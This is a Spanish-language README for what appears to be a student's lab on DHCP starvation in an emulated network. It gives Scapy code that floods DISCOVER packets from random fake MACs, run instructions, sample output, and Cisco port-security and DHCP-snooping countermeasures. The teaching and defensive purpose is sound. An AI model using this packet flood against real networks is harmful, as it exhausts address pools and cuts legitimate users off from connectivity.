<div align="center">

# 💀 DHCP Starvation Attack

**Luiggy Habraham Encarnación Cabrera · Matrícula 2025-0663**

![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-557C94?style=for-the-badge&logo=linux&logoColor=white)
![Scapy](https://img.shields.io/badge/Library-Scapy-FF6F00?style=for-the-badge)
![GNS3](https://img.shields.io/badge/Emulador-GNS3-009639?style=for-the-badge)
![License](https://img.shields.io/badge/Uso-Educativo-blue?style=for-the-badge)

> Agotamiento del pool DHCP mediante solicitudes masivas con MACs aleatorias, impidiendo que los clientes legítimos obtengan una dirección IP.

</div>

---

## ⚠️ Aviso Legal

> [!CAUTION]
> Este repositorio tiene fines **exclusivamente académicos y educativos**.
> Todo el contenido fue ejecutado en un entorno de laboratorio virtualizado y controlado.
> La reproducción de estas técnicas en redes sin autorización expresa es **ilegal**.

---

## 📑 Tabla de Contenido

1. [Objetivo del Laboratorio](#-objetivo-del-laboratorio)
2. [Objetivo del Script](#-objetivo-del-script)
3. [Requisitos](#requisitos-para-utilizar-la-herramienta)
4. [Instalación](#️-instalación)
5. [Documentación de la Red](#️-documentación-de-la-red)
6. [Funcionamiento del Script](#-funcionamiento-del-script)
7. [Uso y Ejecución](#-uso-y-ejecución)
8. [Contramedidas](#-contramedidas)
9. [Capturas de Pantalla](#-capturas-de-pantalla)
10. [Video de Demostración](#-video-de-demostración)

---

## 🎯 Objetivo del Laboratorio

Demostrar cómo un atacante puede agotar el pool de direcciones IP de un servidor DHCP enviando masivamente solicitudes DHCP DISCOVER con MACs de origen aleatorias. Al tratar cada MAC como un cliente distinto, el servidor asigna (o reserva) una IP por solicitud hasta que el pool queda completamente vacío, dejando sin conectividad a todos los clientes legítimos de la red.

---

## 🧩 Objetivo del Script

El script `dhcp_starvation.py` genera y envía de forma continua paquetes DHCP DISCOVER con direcciones MAC de origen completamente aleatorias, simulando miles de clientes distintos. Un hilo paralelo captura los DHCP OFFER del servidor para mostrar en tiempo real las IPs que está entregando, evidenciando el agotamiento progresivo del pool.

### Parámetros Usados

| Parámetro | Tipo | Descripción | Ejemplo |
|---|---|---|---|
| Interfaz de red | Interactivo | Interfaz desde la que se envían los DISCOVERs | `e0` |
| `xid` | Automático | Transaction ID aleatorio por paquete | Generado con `random.randint` |
| MAC falsa | Automático | MAC unicast aleatoria generada por iteración | `2e:4a:f1:88:3c:01` |

### Requisitos para Utilizar la Herramienta

| Requisito | Detalle |
|---|---|
| Sistema operativo | Kali Linux 2023+ (o cualquier Linux) |
| Python | 3.10 o superior |
| Librería Scapy | `scapy >= 2.5.0` |
| Módulo threading | Incluido en Python estándar (stdlib) |
| Privilegios | `sudo` o `root` obligatorio |
| DHCP activo | Servidor DHCP operativo en el segmento |

---

## ⚙️ Instalación

```bash
# 1. Clonar el repositorio
git clone https://github.com/luiggyencarnacion/DHCP-Starvation-Attack.git
cd DHCP-Starvation-Attack

# 2. Crear entorno virtual
python3 -m venv venv
source venv/bin/activate

# 3. Instalar dependencias
pip install -r requirements.txt

# 4. Verificar
python3 -c "from scapy.all import DHCP, BOOTP; print('Scapy OK')"
```

**`requirements.txt`**
```
scapy>=2.5.0
```

---

## 🗺️ Documentación de la Red

### Topología

```
                    ┌─────────┐
                    │   R-1   │  10.6.63.1/24
                    └────┬────┘  Pool DHCP: 10.6.63.0/24
                         │ Gig0/0  ← objetivo del ataque
                         │ Gig0/0
                    ┌────┴────┐
                    │  SW-1   │
                    └──┬───┬──┘
               Gig0/2  │   │  Gig0/1
              ┌────────┘   └───────────┐
         ┌────┴────────┐          ┌────┴─────┐
         │ KaliLinux-1 │          │   PC1    │
         │  Atacante   │          │ Víctima  │
         │ 10.6.63.13  │          │ (sin IP) │
         └─────────────┘          └──────────┘
               e0

  KaliLinux-1 envía miles de DISCOVERs → pool de R-1 se agota
  PC1 solicita IP → R-1 responde: pool vacío → PC1 sin conectividad
```

![Topología GNS3](images/01_topologia_gns3.png)

### Tabla de Direccionamiento

| Dispositivo | Interfaz | Dirección IP | Máscara | Rol |
|---|---|---|---|---|
| R-1 | g0/0 | 10.6.63.1 | /24 | Gateway / Servidor DHCP objetivo |
| SW-1 | Gig0/0 | — | — | Switch de acceso |
| SW-1 | Gig0/1 | — | — | Enlace hacia PC1 |
| SW-1 | Gig0/2 | — | — | Enlace hacia KaliLinux-1 |
| KaliLinux-1 | e0 | 10.6.63.13 | /24 | Atacante |
| PC1 | e0 | Sin IP (pool agotado) | — | Víctima del DoS |

### Detalles del Entorno

| Parámetro | Valor |
|---|---|
| Red | 10.6.63.0/24 |
| Pool DHCP objetivo | 10.6.63.0/24 (253 IPs usables) |
| Emulador | GNS3 |
| Plataforma atacante | Kali Linux |
| VLANs | VLAN 1 (default) |

---

## 🔬 Funcionamiento del Script

### Flujo General

```
Inicio
  ├── Hilo Sniffer (daemon):
  │     └── sniff(udp port 67/68)
  │           └── Si DHCP OFFER: registrar MAC→IP en leases{}
  │                               imprimir fila en tabla
  │
  └── Bucle principal (hilo main):
        └── random_mac()           # MAC unicast aleatoria
        └── build_discover(mac)    # Construye DHCP DISCOVER
        └── sendp(discover, ...)   # Envío inmediato
        └── stats["count"] += 1
        └── Repetir ∞

  └── Ctrl+C → Resumen Final (total, rate, tiempo, IPs obtenidas)
```

### Generación de MAC Unicast Aleatoria

```python
def random_mac():
    mac    = [random.randint(0, 255) for _ in range(6)]
    mac[0] &= 0xFE   # Bit U/L = 0 → unicast (válido para BOOTP/DHCP)
    return ':'.join(f'{b:02x}' for b in mac)
```

### Construcción del DHCP DISCOVER

```python
Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")
/ IP(src="0.0.0.0", dst="255.255.255.255")
/ UDP(sport=68, dport=67)
/ BOOTP(chaddr=mac_to_bytes(fake_mac), xid=random_xid)
/ DHCP(options=[
    ("message-type", "discover"),
    ("param_req_list", [1, 3, 6, 15]),
    "end"
])
```

### Salida en Tiempo Real

```
  Tiempo   MAC Falsa                IP Obtenida
  ──────────────────────────────────────────────────────────────
  00:01    2e:4a:f1:88:3c:01       10.6.63.2
  00:01    7a:12:cd:45:e9:02       10.6.63.3
  00:02    1c:33:ab:77:5d:03       10.6.63.4
  00:02    4f:89:22:bb:13:04       10.6.63.5
  ...
```

### Resumen Final

```
  ╔════════════════════════════════════════╗
  ║            Resumen Final               ║
  ╚════════════════════════════════════════╝
  Solicitudes enviadas : 1,842
  Rate promedio        : 307 pkt/s
  Tiempo activo        : 00:06
  IPs obtenidas        : 251
```

---

## 🚀 Uso y Ejecución

```bash
sudo python3 dhcp_starvation_attack.py
```

**Interacción esperada:**

```
  Interfaces de red disponibles:
    [1] lo
    [2] e0

  Seleccione interfaz (número o nombre): 2

  ╔════════════════════════════════════════╗
  ║        DHCP Starvation Attack          ║
  ╚════════════════════════════════════════╝
  Interfaz  : e0
  [*] Iniciando DHCP Starvation...
  [*] Agotando pool con MACs aleatorias...
```

**Verificación del impacto en el servidor DHCP:**

```
R-1# show ip dhcp pool
R-1# show ip dhcp binding
R-1# show logging
R-1# clear ip dhcp binding *
```

**Verificación: PC1 no obtiene IP:**

```
PC1> ip dhcp
DDORA  IP 0.0.0.0/0     ← Pool agotado, sin IP disponible
```

---

## 🔐 Contramedidas

### Port-Security — Limitar MACs por Puerto

```
SW-1(config)# interface GigabitEthernet0/2
SW-1(config-if)# switchport mode access
SW-1(config-if)# switchport port-security
SW-1(config-if)# switchport port-security maximum 2
SW-1(config-if)# switchport port-security violation restrict
SW-1(config-if)# exit
```

Con `maximum 2` el switch solo aprende 2 MACs por ese puerto. Cualquier trama con una MAC adicional es descartada, bloqueando el ataque.

### DHCP Snooping con Rate Limit por Puerto

```
SW-1(config)# ip dhcp snooping
SW-1(config)# ip dhcp snooping vlan 1

SW-1(config)# interface GigabitEthernet0/2
SW-1(config-if)# ip dhcp snooping limit rate 15
SW-1(config-if)# exit
```

Limita a 15 paquetes DHCP por segundo en el puerto del atacante. Si se supera, el puerto entra en `err-disabled`.

### Verificación

```
SW-1# show ip dhcp snooping
SW-1# show ip dhcp snooping statistics
SW-1# show port-security interface GigabitEthernet0/2
```

### Tabla Resumen

| Contramedida | Efectividad | Impacto operacional |
|---|---|---|
| DHCP Snooping rate limit | Muy alta | Bajo |
| Port-security (restrict) | Alta | Bajo |
| Reducir tiempo de lease | Baja (parcial) | Medio |

---

## 📸 Capturas de Pantalla

```
evidencias/
├── 01_topologia_gns3.png
├── 02_ataque_en_ejecucion.png
├── 03_ips_siendo_asignadas.png
├── 04_pool_agotado_show_dhcp.png
├── 05_pc1_sin_ip.png
├── 06_contramedida_port_security.png
└── 07_verificacion_snooping.png
```

---

## 🎬 Video de Demostración

> 📺 **[Ver demostración en YouTube →](https://youtu.be/wa2fMp5PDNQ?si=WAiJTSkv2enVr7SJ)**

---

<div align="center">

*Documento elaborado con fines académicos en un entorno de laboratorio controlado.*
*El uso de estas técnicas fuera de entornos autorizados es ilegal.*

</div>
